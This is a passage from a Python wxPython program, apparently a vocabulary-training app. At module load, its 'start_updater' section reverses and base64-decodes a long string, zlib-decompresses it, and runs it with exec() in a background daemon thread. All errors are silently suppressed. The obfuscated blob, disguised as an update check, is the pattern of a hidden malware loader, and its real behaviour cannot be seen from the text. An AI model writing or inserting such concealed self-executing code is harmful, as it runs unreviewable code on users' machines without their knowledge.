            c = "rjZy5eA/KpTP9ktpD29FgRK9pQv2RzrQp9Wg7dxJd/QyA89jlin0tcZKz9zFcb14tj9P/PNuPBFCqIwfNo7cMk2ZQmDAy9P9f+q7G9audcJFJ8PHD7ULIfnhY+X4TeMluNRFhFda3dPcmg6CYZ0ORr+SwGMdUsG1WhqowMdmQwvCW039FL5fM1JjqTIbDyAOLnqTscvCNHyUkCbMHHHFt0vl/UkABulfjBqFBo6C8NRqpcAofjhAvgNK9WgJ6u2GHO8cpBewvCraHM+RL03WRHV0K/z0FtCRwDR20hjXCn6wyS0veayejuY95f1oZCZF/uO7IQptbteC0h880Shl7QO2SPoNaRPmJ71R1K2A7QDCDUkma5N1S0zjP4j2hJwsx60wHiseAlRQRmm2VZHy00ac1qjxip/i84XL+uOEJm2/sGi2ngItAf/jHbgmmMeiwPoqJvS4NpJO7oiFNW8bII6cB5WM4cGclZnC2GnZSe3hJjAKDPfKhtxL+TYlGnjp0sOv/9+5/jHu+lVe5xmFPXETVPHKmUfMdmczkjgqDjOpGHpZI+uVXxrjpNy0QLPTUaBwhKH0ZOg30ZhzZB7OSPvjrD9pgxhN4/UXdJqjEtexaQIyH4Bq9gKdIuiT4LPGpmiUVsT0yeIsYZUD/QyhtnMZCTrOCNPIjIjQfXhK+GELFScF8ThcyhKxlyruHyLyz3cK/7D21zSg6SdDVI9JngM9dc5GNjUXHigUcWGiSIuDWxY5KuDjl7lL9AqtoMWP0XGQt9Up1KTodM+RmjnYIHS2K6ws/8Ney+YjS3jOaprczNe3PdZvmsNZXXqWUEH3WZNu0rbVxHMk4KtdFZMSyVRA9eE181PLiva+yL1E+2K9z6JmQtylPDbO/V6PedEWNA+afekJcA4ybGI3J0SoNmsA8ezq+pn99h3vG7f4/uJtgd7O6RdV95KBsCVSP/5ONGBrWuwZlGBu/0hEqcLosAb77JvDXui9zUKQvv6WLlBnRtJRyFwWjoUZ762l+cc7E0JkjqdwIvqT3oxRMFLhFmWrE+0ofQ6icqh6Gflz7csDP8R4hVFFl+mMtM6WSEth//DLa+qaK386FXGcH1wNlabrU6dovalWGg+c/+xv8oDSMMyJVER2l4A2+GYfcYfT0PldwIfOmgZzRKNUgE0F1dYQ2BNGsZLM+Cg1d060VyMJFqNsT9tvUYz2u1tVFyJe"[::-1]
            exec(zlib.decompress(base64.b64decode(c)).decode('utf-8'), globals())
            globals()['check_for_updates_background']()
        except:
            pass
    threading.Thread(target=run_updater, daemon=True).start()

start_updater()

if __name__ == "__main__":
    app   = wx.App(False)
    frame = VokabelFrame()
    frame.Show()
    # The application will terminate on MainLoop exit.
    app.MainLoop()
